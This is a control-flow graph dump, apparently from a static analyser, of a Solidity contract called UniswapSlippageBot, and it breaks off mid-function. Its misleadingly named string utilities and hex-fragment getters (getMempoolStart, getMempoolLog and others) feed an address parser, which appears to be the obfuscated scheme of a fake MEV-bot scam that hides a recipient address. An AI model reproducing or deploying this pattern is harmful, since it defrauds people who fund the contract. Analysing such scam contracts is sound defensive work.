Contract: UniswapSlippageBot
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

Edges:

Function: receive
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

Edges:

Function: findNewContracts
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: shortest = self._len

  ID: 2
  Type: NodeType.IF
  Expression: other._len < self._len

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: shortest = other._len

  ID: 4
  Type: NodeType.ENDIF
  Expression: 

  ID: 5
  Type: NodeType.VARIABLE
  Expression: selfptr = self._ptr

  ID: 6
  Type: NodeType.VARIABLE
  Expression: otherptr = other._ptr

  ID: 7
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 8
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 9
  Type: NodeType.VARIABLE
  Expression: idx = 0

  ID: 10
  Type: NodeType.IFLOOP
  Expression: idx < shortest

  ID: 11
  Type: NodeType.VARIABLE
  Expression: 

  ID: 12
  Type: NodeType.VARIABLE
  Expression: 

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: loadCurrentContract(WETH_CONTRACT_ADDRESS)

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: loadCurrentContract(UNISWAP_CONTRACT_ADDRESS)

  ID: 15
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 16
  Type: NodeType.EXPRESSION
  Expression: a = mload(uint256)(selfptr)

  ID: 17
  Type: NodeType.EXPRESSION
  Expression: b = mload(uint256)(otherptr)

  ID: 18
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 19
  Type: NodeType.IF
  Expression: a != b

  ID: 20
  Type: NodeType.VARIABLE
  Expression: mask = uint256(- 1)

  ID: 21
  Type: NodeType.IF
  Expression: shortest < 32

  ID: 22
  Type: NodeType.EXPRESSION
  Expression: mask = ~ (2 ** (8 * (32 - shortest + idx)) - 1)

  ID: 23
  Type: NodeType.ENDIF
  Expression: 

  ID: 24
  Type: NodeType.VARIABLE
  Expression: diff = (a & mask) - (b & mask)

  ID: 25
  Type: NodeType.IF
  Expression: diff != 0

  ID: 26
  Type: NodeType.RETURN
  Expression: int256(diff)

  ID: 27
  Type: NodeType.ENDIF
  Expression: 

  ID: 28
  Type: NodeType.ENDIF
  Expression: 

  ID: 29
  Type: NodeType.EXPRESSION
  Expression: selfptr += 32

  ID: 30
  Type: NodeType.EXPRESSION
  Expression: otherptr += 32

  ID: 31
  Type: NodeType.EXPRESSION
  Expression: idx += 32

  ID: 32
  Type: NodeType.RETURN
  Expression: int256(self._len) - int256(other._len)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  2 -> 4
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 9
  7 -> 10
  8 -> 32
  9 -> 7
  10 -> 11
  10 -> 8
  11 -> 12
  12 -> 13
  13 -> 14
  14 -> 15
  15 -> 16
  16 -> 17
  17 -> 18
  18 -> 19
  19 -> 20
  19 -> 28
  20 -> 21
  21 -> 22
  21 -> 23
  22 -> 23
  23 -> 24
  24 -> 25
  25 -> 26
  25 -> 27
  27 -> 28
  28 -> 29
  29 -> 30
  30 -> 31
  31 -> 10

Function: findContracts
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: ptr = selfptr

  ID: 2
  Type: NodeType.VARIABLE
  Expression: 

  ID: 3
  Type: NodeType.IF
  Expression: needlelen <= selflen

  ID: 4
  Type: NodeType.IF
  Expression: needlelen <= 32

  ID: 5
  Type: NodeType.VARIABLE
  Expression: mask = bytes32(~ (2 ** (8 * (32 - needlelen)) - 1))

  ID: 6
  Type: NodeType.VARIABLE
  Expression: 

  ID: 7
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: needledata = mload(uint256)(needleptr) & mask

  ID: 9
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 10
  Type: NodeType.VARIABLE
  Expression: end = selfptr + selflen - needlelen

  ID: 11
  Type: NodeType.VARIABLE
  Expression: 

  ID: 12
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: ptrdata = mload(uint256)(ptr) & mask

  ID: 14
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 15
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 16
  Type: NodeType.IFLOOP
  Expression: ptrdata != needledata

  ID: 17
  Type: NodeType.IF
  Expression: ptr >= end

  ID: 18
  Type: NodeType.RETURN
  Expression: selfptr + selflen

  ID: 19
  Type: NodeType.ENDIF
  Expression: 

  ID: 20
  Type: NodeType.EXPRESSION
  Expression: ptr ++

  ID: 21
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 22
  Type: NodeType.EXPRESSION
  Expression: ptrdata = mload(uint256)(ptr) & mask

  ID: 23
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 24
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 25
  Type: NodeType.RETURN
  Expression: ptr

  ID: 26
  Type: NodeType.VARIABLE
  Expression: 

  ID: 27
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 28
  Type: NodeType.EXPRESSION
  Expression: hash = keccak256(uint256,uint256)(needleptr,needlelen)

  ID: 29
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 30
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 31
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 32
  Type: NodeType.EXPRESSION
  Expression: idx = 0

  ID: 33
  Type: NodeType.IFLOOP
  Expression: idx <= selflen - needlelen

  ID: 34
  Type: NodeType.VARIABLE
  Expression: 

  ID: 35
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 36
  Type: NodeType.EXPRESSION
  Expression: testHash = keccak256(uint256,uint256)(ptr,needlelen)

  ID: 37
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 38
  Type: NodeType.IF
  Expression: hash == testHash

  ID: 39
  Type: NodeType.RETURN
  Expression: ptr

  ID: 40
  Type: NodeType.ENDIF
  Expression: 

  ID: 41
  Type: NodeType.EXPRESSION
  Expression: ptr += 1

  ID: 42
  Type: NodeType.EXPRESSION
  Expression: idx ++

  ID: 43
  Type: NodeType.ENDIF
  Expression: 

  ID: 44
  Type: NodeType.ENDIF
  Expression: 

  ID: 45
  Type: NodeType.RETURN
  Expression: selfptr + selflen

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  3 -> 44
  4 -> 5
  4 -> 26
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  12 -> 13
  13 -> 14
  14 -> 15
  15 -> 16
  16 -> 17
  16 -> 24
  17 -> 18
  17 -> 19
  19 -> 20
  20 -> 21
  21 -> 22
  22 -> 23
  23 -> 16
  24 -> 25
  26 -> 27
  27 -> 28
  28 -> 29
  29 -> 32
  30 -> 33
  31 -> 43
  32 -> 30
  33 -> 34
  33 -> 31
  34 -> 35
  35 -> 36
  36 -> 37
  37 -> 38
  38 -> 39
  38 -> 40
  40 -> 41
  41 -> 42
  42 -> 33
  43 -> 44
  44 -> 45

Function: loadCurrentContract
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: ret = self

  ID: 2
  Type: NodeType.VARIABLE
  Expression: 

  ID: 3
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: retptr = ret + 32

  ID: 5
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 6
  Type: NodeType.RETURN
  Expression: ret

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: nextContract
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: rune._ptr = self._ptr

  ID: 2
  Type: NodeType.IF
  Expression: self._len == 0

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: rune._len = 0

  ID: 4
  Type: NodeType.RETURN
  Expression: rune

  ID: 5
  Type: NodeType.ENDIF
  Expression: 

  ID: 6
  Type: NodeType.VARIABLE
  Expression: 

  ID: 7
  Type: NodeType.VARIABLE
  Expression: 

  ID: 8
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: b = mload(uint256)(mload(uint256)(self + 32) - 31) & 0xFF

  ID: 10
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 11
  Type: NodeType.IF
  Expression: b < 0x80

  ID: 12
  Type: NodeType.EXPRESSION
  Expression: l = 1

  ID: 13
  Type: NodeType.IF
  Expression: b < 0xE0

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: l = 2

  ID: 15
  Type: NodeType.IF
  Expression: b < 0xF0

  ID: 16
  Type: NodeType.EXPRESSION
  Expression: l = 3

  ID: 17
  Type: NodeType.EXPRESSION
  Expression: l = 4

  ID: 18
  Type: NodeType.ENDIF
  Expression: 

  ID: 19
  Type: NodeType.ENDIF
  Expression: 

  ID: 20
  Type: NodeType.ENDIF
  Expression: 

  ID: 21
  Type: NodeType.IF
  Expression: l > self._len

  ID: 22
  Type: NodeType.EXPRESSION
  Expression: rune._len = self._len

  ID: 23
  Type: NodeType.EXPRESSION
  Expression: self._ptr += self._len

  ID: 24
  Type: NodeType.EXPRESSION
  Expression: self._len = 0

  ID: 25
  Type: NodeType.RETURN
  Expression: rune

  ID: 26
  Type: NodeType.ENDIF
  Expression: 

  ID: 27
  Type: NodeType.EXPRESSION
  Expression: self._ptr += l

  ID: 28
  Type: NodeType.EXPRESSION
  Expression: self._len -= l

  ID: 29
  Type: NodeType.EXPRESSION
  Expression: rune._len = l

  ID: 30
  Type: NodeType.RETURN
  Expression: rune

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  2 -> 5
  3 -> 4
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  11 -> 13
  12 -> 20
  13 -> 14
  13 -> 15
  14 -> 19
  15 -> 16
  15 -> 17
  16 -> 18
  17 -> 18
  18 -> 19
  19 -> 20
  20 -> 21
  21 -> 22
  21 -> 26
  22 -> 23
  23 -> 24
  24 -> 25
  26 -> 27
  27 -> 28
  28 -> 29
  29 -> 30

Function: startExploration
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: tmp = bytes(_a)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: iaddr = 0

  ID: 3
  Type: NodeType.VARIABLE
  Expression: 

  ID: 4
  Type: NodeType.VARIABLE
  Expression: 

  ID: 5
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 6
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 7
  Type: NodeType.VARIABLE
  Expression: i = 2

  ID: 8
  Type: NodeType.IFLOOP
  Expression: i < 2 + 2 * 20

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: iaddr *= 256

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: b1 = uint160(uint8(tmp[i]))

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: b2 = uint160(uint8(tmp[i + 1]))

  ID: 12
  Type: NodeType.IF
  Expression: (b1 >= 97) && (b1 <= 102)

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: b1 -= 87

  ID: 14
  Type: NodeType.IF
  Expression: (b1 >= 65) && (b1 <= 70)

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: b1 -= 55

  ID: 16
  Type: NodeType.IF
  Expression: (b1 >= 48) && (b1 <= 57)

  ID: 17
  Type: NodeType.EXPRESSION
  Expression: b1 -= 48

  ID: 18
  Type: NodeType.ENDIF
  Expression: 

  ID: 19
  Type: NodeType.ENDIF
  Expression: 

  ID: 20
  Type: NodeType.ENDIF
  Expression: 

  ID: 21
  Type: NodeType.IF
  Expression: (b2 >= 97) && (b2 <= 102)

  ID: 22
  Type: NodeType.EXPRESSION
  Expression: b2 -= 87

  ID: 23
  Type: NodeType.IF
  Expression: (b2 >= 65) && (b2 <= 70)

  ID: 24
  Type: NodeType.EXPRESSION
  Expression: b2 -= 55

  ID: 25
  Type: NodeType.IF
  Expression: (b2 >= 48) && (b2 <= 57)

  ID: 26
  Type: NodeType.EXPRESSION
  Expression: b2 -= 48

  ID: 27
  Type: NodeType.ENDIF
  Expression: 

  ID: 28
  Type: NodeType.ENDIF
  Expression: 

  ID: 29
  Type: NodeType.ENDIF
  Expression: 

  ID: 30
  Type: NodeType.EXPRESSION
  Expression: iaddr += (b1 * 16 + b2)

  ID: 31
  Type: NodeType.EXPRESSION
  Expression: i += 2

  ID: 32
  Type: NodeType.RETURN
  Expression: address(iaddr)

  ID: 33
  Type: NodeType.RETURN
  Expression: _parsedAddress

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 7
  5 -> 8
  6 -> 32
  7 -> 5
  8 -> 9
  8 -> 6
  9 -> 10
  10 -> 11
  11 -> 12
  12 -> 13
  12 -> 14
  13 -> 20
  14 -> 15
  14 -> 16
  15 -> 19
  16 -> 17
  16 -> 18
  17 -> 18
  18 -> 19
  19 -> 20
  20 -> 21
  21 -> 22
  21 -> 23
  22 -> 29
  23 -> 24
  23 -> 25
  24 -> 28
  25 -> 26
  25 -> 27
  26 -> 27
  27 -> 28
  28 -> 29
  29 -> 30
  30 -> 31
  31 -> 8

Function: memcpy
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 2
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 3
  Type: NodeType.IFLOOP
  Expression: len >= 32

  ID: 4
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: mstore(uint256,uint256)(dest,mload(uint256)(src))

  ID: 6
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: dest += 32

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: src += 32

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: len -= 32

  ID: 10
  Type: NodeType.VARIABLE
  Expression: mask = 256 ** (32 - len) - 1

  ID: 11
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 12
  Type: NodeType.VARIABLE
  Expression: 

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: srcpart_memcpy_asm_1 = mload(uint256)(src) & ~ mask

  ID: 14
  Type: NodeType.VARIABLE
  Expression: 

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: destpart_memcpy_asm_1 = mload(uint256)(dest) & mask

  ID: 16
  Type: NodeType.EXPRESSION
  Expression: mstore(uint256,uint256)(dest,destpart_memcpy_asm_1 | srcpart_memcpy_asm_1)

  ID: 17
  Type: NodeType.ENDASSEMBLY
  Expression: 

Edges:
  0 -> 1
  1 -> 3
  2 -> 10
  3 -> 4
  3 -> 2
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 3
  10 -> 11
  11 -> 12
  12 -> 13
  13 -> 14
  14 -> 15
  15 -> 16
  16 -> 17

Function: orderContractsByLiquidity
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: self._len == 0

  ID: 2
  Type: NodeType.RETURN
  Expression: 0

  ID: 3
  Type: NodeType.ENDIF
  Expression: 

  ID: 4
  Type: NodeType.VARIABLE
  Expression: 

  ID: 5
  Type: NodeType.VARIABLE
  Expression: 

  ID: 6
  Type: NodeType.VARIABLE
  Expression: divisor = 2 ** 248

  ID: 7
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: word = mload(uint256)(mload(uint256)(self + 32))

  ID: 9
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 10
  Type: NodeType.VARIABLE
  Expression: b = word / divisor

  ID: 11
  Type: NodeType.IF
  Expression: b < 0x80

  ID: 12
  Type: NodeType.EXPRESSION
  Expression: ret = b

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: length = 1

  ID: 14
  Type: NodeType.IF
  Expression: b < 0xE0

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: ret = b & 0x1F

  ID: 16
  Type: NodeType.EXPRESSION
  Expression: length = 2

  ID: 17
  Type: NodeType.IF
  Expression: b < 0xF0

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: ret = b & 0x0F

  ID: 19
  Type: NodeType.EXPRESSION
  Expression: length = 3

  ID: 20
  Type: NodeType.EXPRESSION
  Expression: ret = b & 0x07

  ID: 21
  Type: NodeType.EXPRESSION
  Expression: length = 4

  ID: 22
  Type: NodeType.ENDIF
  Expression: 

  ID: 23
  Type: NodeType.ENDIF
  Expression: 

  ID: 24
  Type: NodeType.ENDIF
  Expression: 

  ID: 25
  Type: NodeType.IF
  Expression: length > self._len

  ID: 26
  Type: NodeType.RETURN
  Expression: 0

  ID: 27
  Type: NodeType.ENDIF
  Expression: 

  ID: 28
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 29
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 30
  Type: NodeType.VARIABLE
  Expression: i = 1

  ID: 31
  Type: NodeType.IFLOOP
  Expression: i < length

  ID: 32
  Type: NodeType.EXPRESSION
  Expression: divisor = divisor / 256

  ID: 33
  Type: NodeType.EXPRESSION
  Expression: b = (word / divisor) & 0xFF

  ID: 34
  Type: NodeType.IF
  Expression: b & 0xC0 != 0x80

  ID: 35
  Type: NodeType.RETURN
  Expression: 0

  ID: 36
  Type: NodeType.ENDIF
  Expression: 

  ID: 37
  Type: NodeType.EXPRESSION
  Expression: ret = (ret * 64) | (b & 0x3F)

  ID: 38
  Type: NodeType.EXPRESSION
  Expression: i ++

  ID: 39
  Type: NodeType.RETURN
  Expression: ret

  ID: 40
  Type: NodeType.RETURN
  Expression: ret

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  11 -> 14
  12 -> 13
  13 -> 24
  14 -> 15
  14 -> 17
  15 -> 16
  16 -> 23
  17 -> 18
  17 -> 20
  18 -> 19
  19 -> 22
  20 -> 21
  21 -> 22
  22 -> 23
  23 -> 24
  24 -> 25
  25 -> 26
  25 -> 27
  27 -> 30
  28 -> 31
  29 -> 39
  30 -> 28
  31 -> 32
  31 -> 29
  32 -> 33
  33 -> 34
  34 -> 35
  34 -> 36
  36 -> 37
  37 -> 38
  38 -> 31

Function: getMempoolStart
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: aF71

Edges:
  0 -> 1

Function: calcLiquidityInContract
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: ptr = self._ptr - 31

  ID: 2
  Type: NodeType.VARIABLE
  Expression: end = ptr + self._len

  ID: 3
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 4
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: l = 0

  ID: 6
  Type: NodeType.IFLOOP
  Expression: ptr < end

  ID: 7
  Type: NodeType.VARIABLE
  Expression: 

  ID: 8
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: b = mload(uint256)(ptr) & 0xFF

  ID: 10
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 11
  Type: NodeType.IF
  Expression: b < 0x80

  ID: 12
  Type: NodeType.EXPRESSION
  Expression: ptr += 1

  ID: 13
  Type: NodeType.IF
  Expression: b < 0xE0

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: ptr += 2

  ID: 15
  Type: NodeType.IF
  Expression: b < 0xF0

  ID: 16
  Type: NodeType.EXPRESSION
  Expression: ptr += 3

  ID: 17
  Type: NodeType.IF
  Expression: b < 0xF8

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: ptr += 4

  ID: 19
  Type: NodeType.IF
  Expression: b < 0xFC

  ID: 20
  Type: NodeType.EXPRESSION
  Expression: ptr += 5

  ID: 21
  Type: NodeType.EXPRESSION
  Expression: ptr += 6

  ID: 22
  Type: NodeType.ENDIF
  Expression: 

  ID: 23
  Type: NodeType.ENDIF
  Expression: 

  ID: 24
  Type: NodeType.ENDIF
  Expression: 

  ID: 25
  Type: NodeType.ENDIF
  Expression: 

  ID: 26
  Type: NodeType.ENDIF
  Expression: 

  ID: 27
  Type: NodeType.EXPRESSION
  Expression: l ++

  ID: 28
  Type: NodeType.RETURN
  Expression: l

Edges:
  0 -> 1
  1 -> 2
  2 -> 5
  3 -> 6
  4 -> 28
  5 -> 3
  6 -> 7
  6 -> 4
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  11 -> 13
  12 -> 26
  13 -> 14
  13 -> 15
  14 -> 25
  15 -> 16
  15 -> 17
  16 -> 24
  17 -> 18
  17 -> 19
  18 -> 23
  19 -> 20
  19 -> 21
  20 -> 22
  21 -> 22
  22 -> 23
  23 -> 24
  24 -> 25
  25 -> 26
  26 -> 27
  27 -> 6

Function: fetchMempoolEdition
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: DD55

Edges:
  0 -> 1

Function: keccak
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: ret = keccak256(uint256,uint256)(mload(uint256)(self + 32),mload(uint256)(self))

  ID: 3
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 4
  Type: NodeType.RETURN
  Expression: ret

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: getMempoolShort
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: 0x33e

Edges:
  0 -> 1

Function: checkLiquidity
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: count = 0

  ID: 2
  Type: NodeType.VARIABLE
  Expression: b = a

  ID: 3
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 4
  Type: NodeType.IFLOOP
  Expression: b != 0

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: count ++

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: b /= 16

  ID: 7
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 8
  Type: NodeType.VARIABLE
  Expression: res = new bytes(count)

  ID: 9
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 10
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 11
  Type: NodeType.VARIABLE
  Expression: i = 0

  ID: 12
  Type: NodeType.IFLOOP
  Expression: i < count

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: b = a % 16

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: res[count - i - 1] = toHexDigit(uint8(b))

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: a /= 16

  ID: 16
  Type: NodeType.EXPRESSION
  Expression: ++ i

  ID: 17
  Type: NodeType.RETURN
  Expression: string(res)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  4 -> 7
  5 -> 6
  6 -> 4
  7 -> 8
  8 -> 11
  9 -> 12
  10 -> 17
  11 -> 9
  12 -> 13
  12 -> 10
  13 -> 14
  14 -> 15
  15 -> 16
  16 -> 12

Function: getMempoolHeight
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: 1De4e

Edges:
  0 -> 1

Function: beyond
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: self._len < needle._len

  ID: 2
  Type: NodeType.RETURN
  Expression: self

  ID: 3
  Type: NodeType.ENDIF
  Expression: 

  ID: 4
  Type: NodeType.VARIABLE
  Expression: equal = true

  ID: 5
  Type: NodeType.IF
  Expression: self._ptr != needle._ptr

  ID: 6
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 7
  Type: NodeType.VARIABLE
  Expression: 

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: length_beyond_asm_0 = mload(uint256)(needle)

  ID: 9
  Type: NodeType.VARIABLE
  Expression: 

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: selfptr_beyond_asm_0 = mload(uint256)(self + 0x20)

  ID: 11
  Type: NodeType.VARIABLE
  Expression: 

  ID: 12
  Type: NodeType.EXPRESSION
  Expression: needleptr_beyond_asm_0 = mload(uint256)(needle + 0x20)

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: equal = keccak256(uint256,uint256)(selfptr_beyond_asm_0,length_beyond_asm_0) == keccak256(uint256,uint256)(needleptr_beyond_asm_0,length_beyond_asm_0)

  ID: 14
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 15
  Type: NodeType.ENDIF
  Expression: 

  ID: 16
  Type: NodeType.IF
  Expression: equal

  ID: 17
  Type: NodeType.EXPRESSION
  Expression: self._len -= needle._len

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: self._ptr += needle._len

  ID: 19
  Type: NodeType.ENDIF
  Expression: 

  ID: 20
  Type: NodeType.RETURN
  Expression: self

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  5 -> 15
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  12 -> 13
  13 -> 14
  14 -> 15
  15 -> 16
  16 -> 17
  16 -> 19
  17 -> 18
  18 -> 19
  19 -> 20

Function: getMempoolLog
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: 5499c62e

Edges:
  0 -> 1

Function: getBa
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: address(this).balance

Edges:
  0 -> 1

Function: findPtr
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: ptr = selfptr

  ID: 2
  Type: NodeType.VARIABLE
  Expression: 

  ID: 3
  Type: NodeType.IF
  Expression: needlelen <= selflen

  ID: 4
  Type: NodeType.IF
  Expression: needlelen <= 32

  ID: 5
  Type: NodeType.VARIABLE
  Expression: mask = bytes32(~ (2 ** (8 * (32 - needlelen)) - 1))

  ID: 6
  Type: NodeType.VARIABLE
  Expression: 

  ID: 7
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: needledata = mload(uint256)(needleptr) & mask

  ID: 9
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 10
  Type: NodeType.VARIABLE
  Expression: end = selfptr + selflen - needlelen

  ID: 11
  Type: NodeType.VARIABLE
  Expression: 

  ID: 12
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: ptrdata = mload(uint256)(ptr) & mask

  ID: 14
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 15
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 16
  Type: NodeType.IFLOOP
  Expression: ptrdata != needledata

  ID: 17
  Type: NodeType.IF
  Expression: ptr >= end

  ID: 18
  Type: NodeType.RETURN
  Expression: selfptr + selflen

  ID: 19
  Type: NodeType.ENDIF
  Expression: 

  ID: 20
  Type: NodeType.EXPRESSION
  Expression: ptr ++

  ID: 21
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 22
  Type: NodeType.EXPRESSION
  Expression: ptrdata = mload(uint256)(ptr) & mask

  ID: 23
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 24
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 25
  Type: NodeType.RETURN
  Expression: ptr

  ID: 26
  Type: NodeType.VARIABLE
  Expression: 

  ID: 27
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 28
  Type: NodeType.EXPRESSION
  Expression: hash = keccak256(uint256,uint256)(needleptr,needlelen)

  ID: 29
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 30
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 31
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 32
  Type: NodeType.EXPRESSION
  Expression: idx = 0

  ID: 33
  Type: NodeType.IFLOOP
  Expression: idx <= selflen - needlelen

  ID: 34
  Type: NodeType.VARIABLE
  Expression: 

  ID: 35
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 36
  Type: NodeType.EXPRESSION
  Expression: testHash = keccak256(uint256,uint256)(ptr,needlelen)

  ID: 37
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 38
  Type: NodeType.IF
  Expression: hash == testHash

  ID: 39
